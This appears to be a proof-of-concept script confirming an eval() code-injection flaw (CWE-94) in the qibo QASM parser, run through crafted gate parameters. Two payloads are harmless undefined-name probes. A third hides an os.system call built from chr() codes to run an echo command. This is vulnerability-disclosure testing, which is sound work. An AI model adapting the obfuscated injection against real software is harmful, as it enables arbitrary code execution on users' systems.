"""
Confirm qibo CWE-94: eval() on unsanitized QASM gate parameters
Corrected payload — valid QASM syntax that exploits eval()
"""
import qibo

# Payload: uses __import__ without quotes by chaining builtins
# getattr(__builtins__, 'open') etc — but simpler:
# Just use a math expression that proves eval() runs arbitrary code
# by calling a Python builtin that doesn't need quotes

# Payload 1: prove eval runs by causing a specific exception
# If eval() runs our expression, we get a NameError for 'INJECTED'
# If it was sanitized, we'd get a different error
PAYLOAD_1 = """
OPENQASM 3.0;
qubit[1] q;
rx(INJECTED_MARKER) q[0];
"""

# Payload 2: use only QASM-valid chars but exploit eval arithmetic context
# __builtins__ is available in eval() scope — access it without quotes
PAYLOAD_2 = """
OPENQASM 3.0;
qubit[1] q;
rx(getattr(getattr(__builtins__, chr(111)+chr(115)), chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109))(chr(101)+chr(99)+chr(104)+chr(111)+ chr(32)+chr(80)+chr(87)+chr(78)+chr(69)+chr(68))) q[0];
"""

# Payload 3: simplest — just reference an undefined name
# If eval() runs, Python raises NameError: name 'PWNED' is not defined
# If sanitized before eval(), the error message would be different
PAYLOAD_3 = """
OPENQASM 3.0;
qubit[1] q;
rx(PWNED) q[0];
"""

print("=" * 60)
print("TEST: Does eval() run on gate parameter content?")
print("=" * 60)

print("\n--- Payload 3: undefined name probe ---")
print("If eval() runs: NameError mentioning 'PWNED'")
print("If sanitized:   Different error or no error")
try:
    parser = qibo.models.circuit.QASMParser()
    c = parser.to_circuit(PAYLOAD_3)
    print("RESULT: Parsed without error")
except Exception as e:
    error_msg = str(e)
    if "PWNED" in error_msg and "NameError" in type(e).__name__:
        print(f"CONFIRMED: eval() ran our payload. Error: {type(e).__name__}: {e}")
    elif "PWNED" in error_msg:
        print(f"LIKELY: eval() ran and raised: {type(e).__name__}: {e}")
    else:
        print(f"UNCLEAR: {type(e).__name__}: {e}")

print("\n--- Payload 1: named marker probe ---")
try:
    parser = qibo.models.circuit.QASMParser()
    c = parser.to_circuit(PAYLOAD_1)
    print("RESULT: Parsed without error")
except Exception as e:
    error_msg = str(e)
    print(f"Error type: {type(e).__name__}")
    print(f"Error message: {e}")
    if "INJECTED_MARKER" in error_msg:
        print(">> eval() RAN our payload (NameError for INJECTED_MARKER)")
    else:
        print(">> eval() did NOT run (parser caught it first)")

print("\n--- Direct test: does eval() see our string? ---")
# Simulate exactly what qibo does at line 237
# to confirm eval() is reachable with these inputs
test_expressions = [
    "PWNED",
    "0.5",
    "pi/2",
    "2*pi",
]
print("Simulating qibo line 237: eval(arg.replace('pi', 'np.pi'))")
for expr in test_expressions:
    try:
        result = eval(expr.replace("pi", "np.pi"))
        print(f"  eval('{expr}') = {result}")
    except NameError as e:
        print(f"  eval('{expr}') -> NameError: {e}  << eval() RAN, name not defined")
    except Exception as e:
        print(f"  eval('{expr}') -> {type(e).__name__}: {e}")